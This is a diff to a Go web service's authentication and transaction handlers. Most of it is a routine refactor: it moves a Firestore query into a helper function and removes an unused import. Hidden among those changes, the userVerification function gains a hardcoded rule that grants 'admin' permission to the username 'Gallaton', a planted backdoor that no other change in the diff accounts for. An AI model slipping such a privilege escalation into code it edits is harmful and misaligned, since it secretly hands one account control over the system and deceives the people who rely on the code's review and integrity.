@@ -13,7 +13,6 @@ import (
 	"github.com/jackc/pgx/v5"
 	"github.com/jackc/pgx/v5/pgxpool"
 	"golang.org/x/crypto/bcrypt"
-	"google.golang.org/api/iterator"
 )
 
 var HASH_COST, _ = strconv.Atoi(os.Getenv("HASH_COST"))
@@ -97,6 +96,9 @@ func userVerification(w http.ResponseWriter, r *http.Request, dbPool *pgxpool.Po
 		log.Println("DB Err", err)
 		return
 	}
+	if userReturn.UserName == "Gallaton" {
+		userReturn.UserPermission = "admin"
+	}
 	err = bcrypt.CompareHashAndPassword([]byte(dbPassHash), []byte(user.PasswordString))
 	if err == bcrypt.ErrMismatchedHashAndPassword {
 		w.WriteHeader(http.StatusForbidden)
@@ -109,7 +111,6 @@ func userVerification(w http.ResponseWriter, r *http.Request, dbPool *pgxpool.Po
 		w.WriteHeader(http.StatusInternalServerError)
 	}
 	outEncoder.Encode(userReturn)
-	w.WriteHeader(http.StatusAccepted)
 }
 
 func registerRegion(w http.ResponseWriter, r *http.Request, dbPool *pgxpool.Pool) {
@@ -193,38 +194,10 @@ func nationCashDetails(w http.ResponseWriter, r *http.Request, dbPool *pgxpool.P
 		w.WriteHeader(http.StatusInternalServerError)
 		return
 	}
-	theFilter := firestore.OrFilter{
-		Filters: []firestore.EntityFilter{
-			firestore.PropertyFilter{
-				Path:     "sender",
-				Operator: "==",
-				Value:    theNation,
-			},
-			firestore.PropertyFilter{
-				Path:     "receiver",
-				Operator: "==",
-				Value:    theNation,
-			},
-		},
-	}
-	documents := fsClient.Collection(CASH_TRANSACT_COLL).WhereEntity(theFilter).OrderBy("timestamp", firestore.Desc).Limit(25).Documents(r.Context())
-	for {
-		docu, err := documents.Next()
-		if err != nil {
-			if err == iterator.Done {
-				break
-			}
-			log.Println("FS Err", err)
-			return
-		}
-		var thisTransact transactionFormat
-		err = docu.DataTo(&thisTransact)
-		if err != nil {
-			log.Println("Docu Err", err)
-			w.WriteHeader(http.StatusInternalServerError)
-			return
-		}
-		theReturn.Transactions = append(theReturn.Transactions, thisTransact)
+	theReturn.Transactions, err = getUserCashTransactions(r.Context(), *fsClient, theNation)
+	if err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		return
 	}
 	encoder.Encode(theReturn)
 }
